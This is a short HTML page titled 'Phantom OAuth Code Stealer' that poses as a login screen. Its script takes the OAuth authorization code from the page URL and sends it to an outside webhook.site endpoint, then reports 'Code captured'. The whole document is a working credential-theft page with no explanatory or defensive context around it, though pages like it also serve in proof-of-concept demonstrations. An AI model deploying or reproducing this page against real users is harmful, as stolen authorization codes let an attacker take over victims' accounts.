<!DOCTYPE html>
<html>
  <head>
    <title>Phantom OAuth Code Stealer</title>
  </head>
  <body>
    <h2>Logging in...</h2>
    <script>
      const params = new URLSearchParams(window.location.search);
      const code = params.get("code");

      if (code) {
        fetch("https://webhook.site/da806180-59e3-4d3f-8b89-de2a2dc8dd41", {
          method: "POST",
          body: JSON.stringify({ code: code }),
          headers: { "Content-Type": "application/json" }
        }).then(() => {
          document.body.innerHTML = "<h3>✅ Code captured</h3>";
        });
      } else {
        document.body.innerHTML = "<h3>❌ No code received</h3>";
      }
    </script>
  </body>
</html>
